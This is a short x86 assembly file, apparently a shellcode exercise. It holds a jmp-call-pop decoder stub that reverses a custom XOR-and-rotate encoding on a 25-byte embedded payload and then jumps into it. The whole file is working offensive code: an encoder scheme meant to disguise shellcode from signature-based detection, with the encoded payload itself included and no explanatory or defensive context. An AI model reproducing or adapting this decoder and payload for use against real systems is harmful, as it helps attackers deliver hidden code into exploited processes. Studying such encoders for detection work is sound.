
global _start

section .text

_start:
	jmp find_address

decoder:
	pop esi

	xor ecx, ecx
	mul ecx
	mov cl, 25		; length of the shellcode
	mov dl, 0xaa		; initial value of XOR operation

loop1:
	xor dl, byte [esi]	; xor with the current byte
	ror dl, 3		; rotate right with 3
	mov byte [esi], dl	; save back the transformed byte
	inc esi
	loop loop1

	jmp short shellcode	; jump to the original shellcode


find_address:
	call decoder
	shellcode: db 0x23,0x37,0x42,0x13,0x1b,0x17,0xb4,0x30,0x2b,0x11,0x56,0x3c,0x29,0x25,0x96,0x61,0x1c,0x9e,0x78,0x1f,0x86,0x64,0xe8,0x65,0xc9
